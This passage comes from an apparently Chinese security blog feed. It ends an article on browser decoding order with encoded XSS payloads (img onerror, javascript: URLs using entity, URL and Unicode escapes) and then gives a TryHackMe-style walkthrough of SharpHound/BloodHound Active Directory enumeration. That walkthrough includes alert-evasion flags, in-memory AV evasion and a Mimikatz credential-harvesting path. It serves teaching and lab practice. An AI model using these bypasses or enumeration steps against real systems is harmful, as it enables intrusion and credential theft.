Tree。</p><p>这就清晰的总结了对应的浏览器解析顺序，和解码顺序</p><p>因此我们可以看到什么时候我们编码不会被解析。因为我们构建dom树的标签都无法识别。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--标签被编码 g实体编码&amp;#103;--&gt;</span></span><br><span class="line">&lt;im<span class="symbol">&amp;#103;</span> src=1 onerror=&quot;alert(&#x27;img标签名被编码&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--属性名被编码 s实体编码&amp;#115;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> &amp;#<span class="attr">115</span>;<span class="attr">rc</span>=<span class="string">1</span>  <span class="attr">οnerrοr</span>=<span class="string">alert(</span>&#x27;<span class="attr">scr属性被编码</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--响应事件名被编码 o实体编码&amp;#111;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#x27;</span>  &amp;#<span class="attr">111</span>;<span class="attr">nerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">响应事件名onclick被编码</span>&#x27;)&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>但是这个可以弹窗,ALERT不属于html内部</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--响应事件属性值被编码(可以弹窗)! a实体编码&amp;#97;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">οnerrοr</span>=<span class="string">&amp;#97;lert(</span>&#x27;<span class="attr">响应事件体alert被编码</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><h4 id="触发js解析"><a href="#触发js解析" class="headerlink" title="触发js解析"></a>触发js解析</h4><p>^ebc9f6</p><p>在一个页面中可以触发JS解析器的有这么几种</p><p>直接嵌入&lt; script&gt; 代码块。<br>通过&lt; script sr&#x3D;… &gt; 加载代码。<br>各种HTML CSS 参数支持JavaScript：URL 触发调用。<br>CSS expression(…) 语法和某些浏览器的XBL 绑定。<br>事件处理器(Event handlers),比如 onload, onerror, onclick等等。<br>定时器，Timer(setTimeout, setInterval)<br>eval(…) 调用。</p><h4 id="xss如何编码绕过"><a href="#xss如何编码绕过" class="headerlink" title="xss如何编码绕过?"></a>xss如何编码绕过?</h4><h5 id="html实体编码"><a href="#html实体编码" class="headerlink" title="html实体编码"></a>html实体编码</h5><p>不可以放在</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>中，并且编码不能影响标签和属性，从而影响dom树的构建。</p><h5 id="js和unicode编码"><a href="#js和unicode编码" class="headerlink" title="js和unicode编码"></a>js和unicode编码</h5><p>这种要触发js解析器[[#^ebc9f6]]</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--函数名被编码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061lert(&#x27;函数名被编码&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--()被编码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert\u0028&#x27;圆括号被编码&#x27;\u0029&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&#x27;被编码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(\u0027引号被编码\0027&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>经过测试发现只有函数名被编码可以正常弹窗。</p><p>当编码位置在字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在ECMAScript中。因此，Unicode转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\u0061\u006c\u0065\u0072\<span class="title function_">u0074</span>(<span class="string">&#x27;\u0031\u0032&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 alert 和 12</span><br></pre></td></tr></table></figure><p>上面两段代码只有2会执行 1并不会执行 因为括号内的<code>\u0031\u0032</code>并不会被解释为字符串常亮（因为它们没有用引号闭合）所以必须要闭合才可以。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在讨论过各种解析形式后，最后来讨论这些解析的先后顺序。<br>当浏览器从网络堆栈中获得一段内容后，触发HTML解析器来对这篇文档进行词法解析。在这一步中字符引用被解码。在词法解析完成后，DOM树就被创建好了，JavaScript解析器会介入来对内联脚本进行解析。在这一步中Unicode转义序列和Hex转义序列被解码。同时，如果浏览器遇到需要URL的上下文，URL解析器也会介入来解码URL内容。在这一步中URL解码操作被完成。由于URL位置不同，URL解析器可能会在JavaScript解析器之前或之后进行解析。考虑如下两种情况</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Example A: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;UserInput&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">Example B: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>   <span class="attr">onclick</span>=<span class="string">&quot;window.open(&#x27;UserInput&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在例A中，HTML解析器将首先开始工作，并对UserInput中的字符引用进行解码。然后URL解析器开始对href值进行URL解码。最后，如果URL资源类型是JavaScript，那么JavaScript解析器会进行Unicode转义序列和Hex转义序列的解码。再之后，解码的脚本会被执行。因此，这里涉及三轮解码，顺序是HTML，URL和JavaScript。</p><p>在例B中，HTML解析器首先工作。然而接下来，JavaScript解析器开始解析在onclick事件处理器中的值。这是因为在onclick事件处理器中是script的上下文。当这段JavaScript被解析并被执行的时候，它执行的是“window.open()”操作，其中的参数是URL的上下文。在此时，URL解析器开始对UserInput进行URL解码并把结果回传给JavaScript引擎。因此这里一共涉及三轮解码，顺序是HTML，JavaScript和URL。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一步html解析:</span><br><span class="line"><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x29;</span>&quot;</span><br><span class="line">变为：</span><br><span class="line">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</span><br><span class="line">经过url解析:</span><br><span class="line">javascript:\u0061\u006c\u0065\u0072\u0074(15)</span><br><span class="line">javascript:触发了最后的js解析</span><br><span class="line">javascript:alert(15)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD域枚举信息-BloodHound</title>
      <link href="/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-BloodHound/"/>
      <url>/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-BloodHound/</url>
      
        <content type="html"><![CDATA[<p>最后，我们将研究使用<a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a>执行 AD 枚举。 Bloodhound 是迄今为止最强大的AD枚举工具，当它于 2016 年发布时，它永远改变了AD枚举格局。</p><h4 id="Bloodhound-History-寻血猎犬的历史"><a href="#Bloodhound-History-寻血猎犬的历史" class="headerlink" title="Bloodhound History 寻血猎犬的历史"></a>Bloodhound History 寻血猎犬的历史</h4><p>在相当长的一段时间内，红队队员（不幸的是，攻击者）占据了上风。以至于微软在其高级威胁防护解决方案中集成了他们自己版本的 Bloodhound。这一切都归结为以下这句话：</p><p><em>“防御者用列表思考，攻击者用图表思考。” - 未知</em>  </p><p>Bloodhound 允许攻击者（现在也包括防御者）通过互连节点以图形格式可视化AD环境。每个连接都是一条可能的路径，可用于实现目标。相比之下，防御者使用列表，例如域管理员列表或环境中所有主机的列表。<br>这种基于图的思维为攻击者打开了一个世界。它允许进行两阶段攻击。在第一阶段，攻击者会执行网络钓鱼攻击以获得枚举AD信息的初始条目。这个初始有效负载通常非常嘈杂，并且会在攻击者执行除泄露枚举数据之外的任何操作之前被蓝队检测到并包含在内。然而，攻击者现在可以离线使用这些数据以图形格式创建攻击路径，准确显示所需的步骤和跳跃。在第二次网络钓鱼活动中利用这些信息，攻击者通常可以在突破后几分钟内达到他们的目标。它通常比蓝队收到第一个警报的速度还要快。这就是图表思维的力量，这就是为什么这么多蓝队也开始使用这些类型的工具来更好地了解他们的安全态势。</p><h4 id="Sharphound-猎犬"><a href="#Sharphound-猎犬" class="headerlink" title="Sharphound 猎犬"></a>Sharphound 猎犬</h4><p>您经常会听到用户将 Sharphound 和 Bloodhound 互换使用。然而，它们并不相同。 Sharphound是Bloodhound的枚举工具。它用于枚举 AD 信息，然后可以在 Bloodhound 中直观地显示这些信息。 Bloodhound 是用于显示AD攻击图的实际GUI 。因此，我们首先需要学习如何使用Sharphound来枚举AD ，然后才能使用Bloodhound直观地看到结果。</p><p>**共有三种不同的 Sharphound</p><p><strong>Sharphound.ps1</strong> - 用于运行 Sharphound 的PowerShell脚本。不过，最新版本的 Sharphound 已经停止发布 Powershell 脚本版本。该版本非常适合与 RAT 一起使用，因为脚本可以直接加载到内存中，从而逃避磁盘上的AV扫描。<br><em>解释一下AV扫描</em> 防病毒软件是一个程序或一组程序，旨在防止、搜索、检测和删除软件病毒以及其他恶意软件（如蠕虫、木马、广告软件等）。</p><p><strong>Sharphound.exe</strong> - 用于运行 Sharphound 的 Windows 可执行版本。</p><p><strong>AzureHound.ps1</strong> - 用于运行 Sharphound for Azure（Microsoft 云计算服务）实例的PowerShell脚本。 Bloodhound 可以提取从 Azure 枚举的数据，以查找与 Azure 身份和访问管理配置相关的攻击路径。</p><p><em>注意：您的 Bloodhound 和 Sharphound 版本必须匹配才能获得最佳结果。通常会对 Bloodhound 进行更新，这意味着旧的 Sharphound 结果无法被摄取。该网络是使用 Bloodhound v4.1.0 创建的。请确保将此版本与 Sharphound 结果一起使用。</em></p><p>在评估中使用这些收集器脚本时，这些文件很可能被检测为恶意软件并向蓝队发出警报。这又是我们未加入域的 Windows 计算机可以提供帮助的地方。我们可以使用<code>runas</code>命令注入 AD 凭据并将 Sharphound 指向域控制器。由于我们控制这台 Windows 计算机，因此我们可以禁用AV或为特定文件或文件夹创建例外，这已在 THMJMP1 计算机上为您执行。您可以在该主机上的<code>C:\Tools\</code>目录中找到 Sharphound 二进制文件。我们将使用 SharpHound.exe 版本进行枚举，但也可以随意使用其他两个版本。我们将执行 Sharphound，如下所示：</p><p>因此可以看到想要使用猎狗 这个自动化AD工具我们可能还必须要找一个非域的机器,否则就会被杀掉或者是域发生警告.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharphound.exe <span class="literal">--CollectionMethods</span> &lt;Methods&gt; <span class="literal">--Domain</span> za.tryhackme.com <span class="literal">--ExcludeDCs</span></span><br></pre></td></tr></table></figure><p>***相关参数解释:</p><ul><li>CollectionMethods - 确定 Sharphound 将收集哪种数据。最常见的选项是“默认”或“全部”。另外，由于 Sharphound 会缓存信息，因此一旦第一次运行完成，您只能使用 Session 收集方法来检索新的用户会话以加快该过程。</li><li>域 - 在这里，我们指定要枚举的域。在某些情况下，您可能想要枚举与您的现有域信任的父域或其他域。您可以通过更改此参数来告诉 Sharphound 应枚举​​哪个域。</li><li>ExcludeDCs - 这将指示 Sharphound 不要接触域控制器，从而降低 Sharphound 运行引发警报的可能性。</li></ul><p>相关所有参数:<a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html">https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html</a></p><p><a href="%E7%8C%8E%E7%8B%97.md">猎狗</a></p><p>使用上一个任务中的 SSH PowerShell 会话，将 Sharphound 二进制文件复制到 AD 用户的文档目录，当然我不知道是不是必须把这个放到用户目录文档中，才能体现使用的相关域用户名义去运行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">copy</span> C:\Tools\Sharphound.exe ~\Documents\ </span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cd</span> ~\Documents\ </span><br><span class="line"><span class="built_in">PS</span> C:\Users\gordon.stevens\Documents&gt;</span><br></pre></td></tr></table></figure><p>现在是一切都准备好了，虽然目前我们的服务器已经加入到了域中，但是此时我们使用的猎狗脚本。并未触发报警。我们直接使用 我们将使用 All 和 Session 收集方法运行 Sharphound：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe <span class="literal">--CollectionMethods</span> All <span class="literal">--Domain</span> za.tryhackme.com <span class="literal">--ExcludeDCs</span></span><br></pre></td></tr></table></figure><p>Sharphound 执行枚举大约需要 1 分钟。在较大的组织中，第一次执行可能需要更长的时间，甚至几个小时。完成后，您将在执行 Sharphound 的同一文件夹中获得一个带时间戳的 ZIP 文件。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240831103147.png" alt="image.png"><br>我们现在可以使用 Bloodhound 提取此 ZIP，以直观地向我们展示攻击路径。这就是我们最开始提到的一种思想，图表的思想，我们使用猎狗去嗅探之后使用blood进行一个相关的信息的展示之后显示攻击路径。</p><h4 id="Bloodhound-寻血猎犬"><a href="#Bloodhound-寻血猎犬" class="headerlink" title="Bloodhound 寻血猎犬"></a>Bloodhound 寻血猎犬</h4><p>如前所述，Bloodhound 是一个 GUI，允许我们导入 Sharphound 捕获的数据并将其可视化到攻击路径中。 Bloodhound 使用 Neo4j 作为其后端数据库和图形系统。 Neo4j 是一个图形数据库管理系统。如果您使用 AttackBox，则可以使用 Dock 中的红色 Bloodhound 图标来启动它。在所有其他情况下，请确保您的攻击计算机上安装并配置了 Bloodhound 和 neo4j。无论哪种方式，了解后台发生的事情都是有好处的。在启动 Bloodhound 之前，我们需要加载 Neo4j：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240831110258.png" alt="image.png"><br>此时已经启动数据库管理工具<br>在另一个终端选项卡中，运行<code>bloodhound --no-sandbox</code> 。这将向您显示身份验证GUI ：<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39f261aecedccbaf118eb2ee69d55129.png"></p><p>neo4j 数据库的默认凭据为<code>neo4j:neo4j</code> 。使用它在 Bloodhound 中进行身份验证。要导入我们的结果，您需要从 Windows 主机恢复 ZIP 文件。最简单的方法是在 AttackBox 上使用 SCP 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp grace.brooks@THMJMP1.za.tryhackme.com:c:/Tools/20240831083709_BloodHound.zip .</span><br></pre></td></tr></table></figure><p>一旦您提供密码，这会将结果复制到您当前的工作目录。将 ZIP 文件拖放到 Bloodhound GUI上以导入 Bloodhound。它将显示正在提取文件并启动导入。导入所有JSON文件后，我们可以开始使用 Bloodhound 枚举该特定域的攻击路径。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240831110537.png" alt="image.png"></p><h4 id="Attack-Paths-攻击路径"><a href="#Attack-Paths-攻击路径" class="headerlink" title="Attack Paths 攻击路径"></a>Attack Paths 攻击路径</h4><p>Bloodhound 可以显示多种攻击路径。按“搜索节点”旁边的三个条纹将显示选项。第一个选项卡向我们显示有关当前进口的信息</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5d695d25afebc2b1dfc7cb408704e755.png"><br>Bloodhound 可以显示多种攻击路径。按“搜索节点”旁边的三个条纹将显示选项。第一个选项卡向我们显示有关当前进口的信息</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a6e1af6f79653eeedb18ac9c3be7a038.png"></p><ul><li><p><strong>Overview</strong> - Provides summaries information such as the number of active sessions the account has and if it can reach high-value targets.<br>  <strong>概述</strong>- 提供摘要信息，例如帐户拥有的活动会话数以及是否可以达到高价值目标。  </p></li><li><p><strong>Node Properties</strong> - Shows information regarding the AD account, such as the display name and the title.<br>  <strong>节点属性</strong>- 显示有关AD帐户的信息，例如显示名称和标题。  </p></li><li><p><strong>Extra Properties</strong> - Provides more detailed AD information such as the distinguished name and when the account was created.<br>  <strong>额外属性</strong>- 提供更详细的AD信息，例如可分辨名称和创建帐户的时间。  </p></li><li><p><strong>Group Membership</strong> - Shows information regarding the groups that the account is a member of.<br>  <strong>组成员资格</strong>- 显示有关帐户所属组的信息。  </p></li><li><p><strong>Local Admin Rights</strong> - Provides information on domain-joined hosts where the account has administrative privileges.<br>  <strong>本地管理员权限</strong>- 提供有关帐户具有管理权限的已加入域的主机的信息。  </p></li><li><p><strong>Execution Rights</strong> - Provides information on special privileges such as the ability to RDP into a machine.<br>  <strong>执行权限</strong>- 提供有关特殊权限的信息，例如通过RDP访问计算机的能力。  </p></li><li><p><strong>Outbound Control Rights</strong> - Shows information regarding AD objects where this account has permissions to modify their attributes.<br>  <strong>出站控制权限</strong>- 显示有关此帐户有权修改其属性的AD对象的信息。  </p></li><li><p><strong>Inbound Control Rights</strong> -  Provides information regarding AD objects that can modify the attributes of this account.<br>  <strong>入站控制权限</strong>- 提供有关可修改此帐户属性的AD对象的信息。<br>如果您想了解每个类别的更多信息，可以按信息查询旁边的数字。例如，让我们看看与我们的帐户关联的组成员身份。通过按“First Degree Group Membership”旁边的数字，我们可以看到我们的帐户是两个组的成员。</p></li></ul><p>接下来，我们将研究分析查询。这些是 Bloodhound 的创建者自己编写的查询，用于列举有用的信息<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/247be9dc8f34b8de181516199b0664dd.png"></p><p>在“域信息”部分下，我们可以运行“查找所有域管理员”查询。请注意，您可以按 LeftCtrl 更改标签显示设置。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e4a7afd2acd099df71dc70d9eccf705.png" alt="Bloodhound"></p><p>图标称为节点，线称为边。让我们更深入地了解 Bloodhound 向我们展示的内容。有一个用户名为<strong>T0_TINUS.GREEN</strong>的AD用户帐户，它是<strong>Tier 0 ADMINS</strong>组的成员。但是，该组是<strong>DOMAIN ADMINS</strong>组中的嵌套组，这意味着属于<strong>第 0 层 ADMINS</strong>组的所有用户实际上都是 DA。<br>此外，还有一个用户名为<strong>ADMINISTRATOR</strong>的附加AD帐户，该帐户属于<strong>DOMAIN ADMINS</strong>组。因此，如果我们想获得 DA 权限，我们的攻击面中可能会尝试破坏两个帐户。由于<strong>管理员</strong>帐户是内置帐户，因此我们可能会关注用户帐户。</p><p>前面的任务中讨论的每个AD对象都可以是 Bloodhound 中的一个节点，并且每个对象都有一个不同的图标来描述其对象类型。如果我们想制定攻击路径，我们需要查看当前位置和我们拥有的特权与我们想要去的地方之间的可用边缘。 Bloodhound 有各种可用的边缘，可以通过过滤器图标访问：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c21ccdbdd84a6e709d39fdff14764cea.png" alt="Bloodhound"></p><p>随着新攻击媒介的发现，这些内容也会不断更新。我们将考虑在未来的网络中利用这些不同的优势。但是，让我们看看仅使用默认边和一些特殊边的最基本的攻击路径。我们将在 Bloodhound 中运行搜索来枚举攻击路径。按路径图标即可进行路径搜索</p><p>我们的起始节点将是我们的AD用户名，我们的结束节点将是<strong>第 1 层 ADMINS</strong>组，因为该组对服务器具有管理权限。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b7ae2e4f8e1824e25e69fa69d95c4a4e.png" alt="Bloodhound"></p><p>如果使用所选边缘过滤器没有可用的攻击路径，Bloodhound 将显示“未找到结果”。<strong>请注意，这也可能是由于 Bloodhound&#x2F;Sharphound 不匹配造成的，这意味着结果未正确摄取。请使用 Bloodhound v4.1.0。<strong>然而，在我们的例子中，Bloodhound 显示了一条攻击路径。它显示</strong>T1 管理员 ACCOUNT</strong>之一通过使用其凭据对<strong>THMJMP1</strong> （工作站）进行身份验证，破坏了分层模型。它还表明属于<strong>DOMAIN USERS</strong>组的任何用户（包括我们的 AD 帐户）都能够通过RDP连接到该主机。<br>我们可以执行如下操作来利用这条路径：</p><ol><li>Use our AD credentials to RDP into <strong>THMJMP1</strong>.<br> 使用我们的 AD 凭据通过RDP进入<strong>THMJMP1</strong> 。</li><li>Look for a privilege escalation vector on the host that would provide us with Administrative access.<br> 在主机上寻找可为我们提供管理访问权限的权限升级向量。</li><li>Using Administrative access, we can use credential harvesting techniques and tools such as Mimikatz.<br> 通过管理访问，我们可以使用凭据收集技术和工具，例如 Mimikatz。</li><li>Since the T1 Admin has an active session on <strong>THMJMP1</strong>, our credential harvesting would provide us with the NTLM hash of the associated account.<br> 由于 T1 管理员在<strong>THMJMP1</strong>上有一个活动会话，因此我们的凭据收集将为我们提供关联帐户的NTLM哈希值。</li></ol><p>这是一个简单的例子。一般情况下，攻击路径可能比较复杂，需要采取多次行动才能达到最终目标。如果您对与每个边缘相关的漏洞感兴趣，以下<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html">Bloodhound 文档</a>提供了很好的指南。 Bloodhound 是一款极其强大的AD枚举工具，可以深入了解攻击面的AD结构。值得花精力去尝试它并了解它的各种功能。</p><h4 id="Session-Data-Only-仅会话数据"><a href="#Session-Data-Only-仅会话数据" class="headerlink" title="Session Data Only 仅会话数据"></a>Session Data Only 仅会话数据</h4><p>AD的结构没有改变 在大型组织中经常出现。可能会有几个新员工， 但 OU、组、用户和权限的整体结构将 保持不变。</p><p>然而，不断变化的一件事是活动会话和登录事件。由于 Sharphound 创建AD结构的时间点快照，因此活动会话数据并不总是准确的，因为某些用户可能已经注销了其会话，或者新用户可能已经建立了新会话。这是需要注意的重要事项，也是我们希望定期执行 Sharphound 的原因。<br>一个好的方法是在评估开始时使用“全部”收集方法执行 Sharphound，然后使用“会话”收集方法每天至少执行两次 Sharphound。这将为您提供新的会话数据并确保这些运行速度更快，因为它们不会再次枚举整个AD结构。执行这些会话运行的最佳时间是在 10:00 左右，此时用户喝了第一杯咖啡并开始工作，然后在 14:00 左右，即他们午休回来但回家之前。</p><p>在从这些新的 Sharphound 运行中导入数据之前，您可以通过单击“清除会话信息”在“数据库信息”选项卡上清除 Bloodhound 中的停滞会话数据</p><p>Benefits 好处</p><p>-<br>提供用于AD枚举的GUI 。</p><p>-<br>能够显示枚举的AD信息的攻击路径。</p><p>-<br>    提供对通常需要多次手动查询才能恢复的AD对象的更深刻见解。</p><p>Drawbacks 缺点</p><ul><li>  需要执行 Sharphound，该程序噪音较大，通常可以被 AV 或EDR解决方案检测到。</li></ul><h3 id="清楚数据"><a href="#清楚数据" class="headerlink" title="清楚数据"></a>清楚数据</h3><h3 id="步骤-1：停止-Neo4j-服务"><a href="#步骤-1：停止-Neo4j-服务" class="headerlink" title="步骤 1：停止 Neo4j 服务"></a>步骤 1：停止 Neo4j 服务</h3><p>确保 Neo4j 数据库服务已经停止，以避免在删除文件时出现问题。根据你的系统配置，你可以使用以下命令停止 Neo4j 服务：</p><p><strong>在 Windows 上：</strong></p><p>powershellCopy Code</p><p><code>Stop-Service -Name neo4j</code></p><p><strong>在 Linux 上（如果你通过系统服务启动 Neo4j）：</strong></p><p>bashCopy Code</p><p><code>sudo systemctl stop neo4j</code></p><h3 id="步骤-2：删除-Neo4j-数据库文件"><a href="#步骤-2：删除-Neo4j-数据库文件" class="headerlink" title="步骤 2：删除 Neo4j 数据库文件"></a>步骤 2：删除 Neo4j 数据库文件</h3><p>Neo4j 数据库通常存储在以下位置：</p><p><strong>在 Windows 